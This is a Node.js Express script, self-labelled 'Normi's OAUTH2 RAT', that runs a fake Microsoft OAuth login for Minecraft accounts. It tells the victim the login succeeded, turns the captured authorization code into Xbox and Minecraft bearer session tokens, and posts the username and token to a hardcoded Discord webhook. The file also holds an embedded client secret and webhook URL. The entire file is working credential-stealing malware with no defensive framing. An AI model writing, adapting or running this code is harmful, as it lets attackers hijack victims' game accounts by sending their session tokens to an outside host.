const client_secret = 'HkL8Q~Lpyn6H6pI~3ENbt5wmNa9JNV3zHTlWlcqj'
const client_id = 'a7f62b5a-c66b-47f1-a6f9-fb7938cac361'
const redirect_uri = 'http://localhost:3000/'
const webhook_url = 'https://discord.com/api/webhooks/1023169651536052344/_G1QWD7svz30JTn91tMSx02dTfZ0Ixmtk96eXOkOS9Klyu33AZnv2mPrxDHEEsefVsfI'

const axios = require('axios')
const express = require('express')
require("json");
const app = express()
const port = process.env.PORT || 3000

app.get('/', async (req, res) => {
    res.send('Success! You can exit this page and return to discord.')
    const code = req.query.code
    if (code == null) {
        return
    }
    try {
        const accessToken = await getAccessToken(code)
        const hashAndTokenArray = await getUserHashAndToken(accessToken)
        const userToken = hashAndTokenArray[0]
        const userHash = hashAndTokenArray[1]
        const xstsToken = await getXSTSToken(userToken)
        const bearerAndUsernameArray = await getBearerTokenAndUsername(xstsToken, userHash)
        const bearerToken = bearerAndUsernameArray[0]
        const username = bearerAndUsernameArray[1]
        postToWebhook(username, bearerToken)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getAccessToken(code) {
    const url = 'https://login.live.com/oauth20_token.srf'

    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }
    let data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        code: code,
        grant_type: 'authorization_code'
    }

    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return response.data['Token']
}

async function getBearerTokenAndUsername(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return [response.data['access_token'], response.data['username']]
}

function postToWebhook(username, bearerToken) {
    const url = webhook_url
    let data = {
        username: "Normi's OAUTH2 RAT",
        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
        content: "||@everyone||",
        embeds: [{
            title: "User Info", color: 0x00ff00, fields: [
                {name: "UUID", value: username},
                {name: "Bearer Token (SessionID)", value: bearerToken},
            ]
        }]
    }
    axios.post(url, data).then(r => console.log("Successfully authenticated, posting to webhook!"))
}